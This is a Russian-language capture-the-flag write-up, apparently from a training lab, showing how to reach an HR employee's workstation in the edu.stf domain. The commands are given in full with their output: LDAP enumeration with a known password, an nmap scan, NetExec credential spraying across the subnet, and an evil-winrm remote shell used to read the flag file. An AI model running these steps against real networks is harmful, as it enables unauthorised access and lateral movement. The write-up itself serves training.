# [infra-5] Получение доступа к компьютеру сотрудника HR-департамента

## Description

Получите доступ к компьютеру HR-сотрудника `S. Dotson` и 
к содержимому файла `hr.txt`.

# Solution

Чтож, аналогично с поиском телефона попробуем найти данные
по HR внутри AD:

```bash
ldapsearch -x -H ldap://10.154.16.134 -D "CN=Ralf Andrews,CN=Users,DC=edu,DC=stf" -w 'dancer' -b "DC=edu,DC=stf" "(department=*HR*)" sAMAccountName description info

# extended LDIF
#
# LDAPv3
# base <DC=edu,DC=stf> with scope subtree
# filter: (department=*HR*)
# requesting: sAMAccountName description info
#

# s_dotson, HR department, Departments, edu.stf
dn: CN=s_dotson,OU=HR department,OU=Departments,DC=edu,DC=stf
sAMAccountName: s_dotson

# t_mathis, HR department, Departments, edu.stf
dn: CN=t_mathis,OU=HR department,OU=Departments,DC=edu,DC=stf
sAMAccountName: t_mathis

# frazier, HR department, Departments, edu.stf
dn: CN=frazier,OU=HR department,OU=Departments,DC=edu,DC=stf
sAMAccountName: c_frazier

# search reference
ref: ldap://ForestDnsZones.edu.stf/DC=ForestDnsZones,DC=edu,DC=stf

# search reference
ref: ldap://DomainDnsZones.edu.stf/DC=DomainDnsZones,DC=edu,DC=stf

# search reference
ref: ldap://edu.stf/CN=Configuration,DC=edu,DC=stf

# search result
search: 2
result: 0 Success

# numResponses: 7
# numEntries: 3
# numReferences: 3
```

Среди прочих мы нашли `s_dotson` к которому мы знаем пароль `ricardo`

Теперь просканируем сеть чтобы попробовать войти используя креды `HR`

```bash
nmap -Pn -p 3389,5985,445 10.154.16.0/24 --open
```

Почему такие ip:
- `3389` (`RDP` -- рабочий стол)
- `5985` (`WinRM` -- удаленное управление)
- `445` (`SMB` -- файлы)

Результат сканирования:
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-25 09:00 UTC
Nmap scan report for 10.154.16.100
Host is up (0.25s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 10.154.16.104
Host is up (0.25s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 10.154.16.105
Host is up (0.25s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 10.154.16.106
Host is up (0.25s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 10.154.16.107
Host is up (0.27s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 10.154.16.134
Host is up (0.26s latency).
Not shown: 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Nmap scan report for 10.154.16.135
Host is up (0.62s latency).
Not shown: 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Nmap scan report for 10.154.16.196
Host is up (0.33s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 10.154.16.197
Host is up (0.31s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 10.154.16.198
Host is up (0.36s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 10.154.16.201
Host is up (0.31s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 10.154.16.202
Host is up (0.33s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 10.154.16.203
Host is up (0.33s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 10.154.16.204
Host is up (0.25s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 10.154.16.205
Host is up (0.25s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 10.154.16.208
Host is up (0.28s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 256 IP addresses (256 hosts up) scanned in 30.13 seconds
```



```bash
nxc smb 10.154.16.0/24 -u s_dotson -p ricardo
```

1. `nxc smb`
    `nxc`: Это `NetExec`, ранее известный как `CrackMapExec` или `CME`

    `smb`: Протокол, с которым мы работаем (`Server Message Block`). Это протокол `Windows` для доступа к файлам, принтерам и удаленного управления. В корпоративных сетях он почти всегда открыт на порту 445.

2. `10.154.16.0/24`
    Что это: Цель сканирования (`CIDR`-нотация).

    Смысл: Это означает "просканируй все IP-адреса от `10.154.16.1` до `10.154.16.254`". `nxc` сделает это очень быстро, так как он оптимизирован для работы с большими диапазонами (использует асинхронность и потоки).

3. `-u s_dotson`
    Что это: Имя пользователя (Username).

    Смысл: `nxc` попытается аутентифицироваться на каждом найденном хосте под этим логином.

4. `-p ricardo`
    Что это: Пароль (Password).

    Смысл: Пароль для этого пользователя.

```bash
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating missing folder logs/sam
[*] Creating missing folder logs/lsa
[*] Creating missing folder logs/ntds
[*] Creating missing folder logs/dpapi
[*] Creating default workspace
[*] Initializing WMI protocol database
[*] Initializing WINRM protocol database
[*] Initializing VNC protocol database
[*] Initializing SSH protocol database
[*] Initializing RDP protocol database
[*] Initializing NFS protocol database
[*] Initializing LDAP protocol database
[*] Initializing FTP protocol database
[*] Initializing SMB protocol database
[*] Initializing MSSQL protocol database
[*] Copying default configuration file
SMB         10.154.16.135   445    DC-2             [*] Windows Server 2016 Standard 14393 x64 (name:DC-2) (domain:edu.stf) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.154.16.134   445    DC               [*] Windows Server 2016 Standard 14393 x64 (name:DC) (domain:edu.stf) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.154.16.202   445    JHEBERT          [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:JHEBERT) (domain:edu.stf) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         10.154.16.204   445    MMCDOWELL        [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:MMCDOWELL) (domain:edu.stf) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         10.154.16.196   445    SDOTSON          [*] Windows 10 Enterprise 19045 x64 (name:SDOTSON) (domain:edu.stf) (signing:False) (SMBv1:True)
SMB         10.154.16.201   445    LBLACKBURN       [*] Windows 10 Enterprise 19045 x64 (name:LBLACKBURN) (domain:edu.stf) (signing:False) (SMBv1:True)
SMB         10.154.16.198   445    CFRAZIER         [*] Windows 10 Enterprise 19045 x64 (name:CFRAZIER) (domain:edu.stf) (signing:False) (SMBv1:True)
SMB         10.154.16.203   445    CBLAIR           [*] Windows 10 Enterprise 19045 x64 (name:CBLAIR) (domain:edu.stf) (signing:False) (SMBv1:True)
SMB         10.154.16.205   445    GRODRIQUEZ       [*] Windows 10 Enterprise 19045 x64 (name:GRODRIQUEZ) (domain:edu.stf) (signing:False) (SMBv1:True)
SMB         10.154.16.208   445    MHOLDEN          [*] Windows 10 Enterprise 19045 x64 (name:MHOLDEN) (domain:edu.stf) (signing:False) (SMBv1:True)
SMB         10.154.16.106   445    SHPOINT          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SHPOINT) (domain:edu.stf) (signing:False) (SMBv1:None)
SMB         10.154.16.104   445    EXCHANGE         [*] Windows 10 / Server 2019 Build 17763 x64 (name:EXCHANGE) (domain:edu.stf) (signing:True) (SMBv1:None)
SMB         10.154.16.197   445    TMATHIS          [*] Windows 10 Enterprise 19045 x64 (name:TMATHIS) (domain:edu.stf) (signing:False) (SMBv1:True)
SMB         10.154.16.105   445    MSSQL            [*] Windows 10 / Server 2019 Build 17763 x64 (name:MSSQL) (domain:edu.stf) (signing:False) (SMBv1:None)
SMB         10.154.16.107   445    BACKUP           [*] Windows 10 / Server 2019 Build 17763 x64 (name:BACKUP) (domain:edu.stf) (signing:False) (SMBv1:None)
SMB         10.154.16.135   445    DC-2             [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.100   445    LOGC             [*] Windows 10 / Server 2019 Build 17763 x64 (name:LOGC) (domain:logc) (signing:False) (SMBv1:None)
SMB         10.154.16.134   445    DC               [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.202   445    JHEBERT          [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.204   445    MMCDOWELL        [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.196   445    SDOTSON          [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.201   445    LBLACKBURN       [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.198   445    CFRAZIER         [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.203   445    CBLAIR           [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.205   445    GRODRIQUEZ       [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.208   445    MHOLDEN          [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.106   445    SHPOINT          [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.104   445    EXCHANGE         [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.197   445    TMATHIS          [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.105   445    MSSQL            [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.107   445    BACKUP           [+] edu.stf\s_dotson:ricardo
SMB         10.154.16.100   445    LOGC             [-] logc\s_dotson:ricardo STATUS_LOGON_FAILURE
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Искомый хост `SDOTSON` по адресу `10.154.16.196#445`

Так как 5985 открыт попробуем войти:

```bash
evil-winrm -i 10.154.16.196 -u s_dotson -p ricardo

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\S_Dotson\Documents> Get-ChildItem -Path C:\ -Filter hr.txt -Recurse -ErrorAction SilentlyContinue


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/25/2026   9:31 AM             38 hr.txt


    Directory: C:\Program Files\7-Zip\Lang


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/28/2018   9:00 AM           8620 hr.txt

*Evil-WinRM* PS C:\Users\S_Dotson\Documents> cat C:\hr.txt
f6084109-fe48-461c-8bad-8f677eca6605
*Evil-WinRM* PS C:\Users\S_Dotson\Documents>
```

Содержимое `hr.txt`: `f6084109-fe48-461c-8bad-8f677eca6605`

